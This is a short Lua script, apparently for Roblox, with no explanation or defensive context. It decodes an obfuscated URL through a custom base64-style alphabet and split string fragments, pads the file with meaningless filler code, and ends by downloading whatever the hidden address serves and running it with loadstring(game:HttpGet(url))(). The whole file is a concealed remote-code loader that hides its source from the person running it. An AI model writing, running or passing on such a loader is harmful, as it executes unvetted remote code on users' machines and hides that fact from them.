local _0x = "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA9876543210-+"
local _1x = {}
for _2x = 1, #_0x do
    _1x[_0x:sub(_2x, _2x)] = _2x - 1
end
local _a = "Zsi9Xsn3oB0Dbcm9adq"
local _b = "KYR4QY79EXNu6oAy7Zv"
local _c = "C5jMeD"
local _3x = _a .. _b .. _c
local _4x = {}
for _5x = 1, #_3x, 4 do
    local a = _1x[_3x:sub(_5x, _5x)]
    local b = _1x[_3x:sub(_5x + 1, _5x + 1)]
    local c = _1x[_3x:sub(_5x + 2, _5x + 2)]
    local d = _1x[_3x:sub(_5x + 3, _5x + 3)]
    local n = a * 262144 + b * 4096 + c * 64 + d
    _4x[#_4x + 1] = string.char(math.floor(n / 65536) % 256)
    _4x[#_4x + 1] = string.char(math.floor(n / 256) % 256)
    _4x[#_4x + 1] = string.char(n % 256)
end
local url = table.concat(_4x)
local junk = 42
if junk > 40 then
    junk = junk + 1
end
loadstring(game:HttpGet(url))()
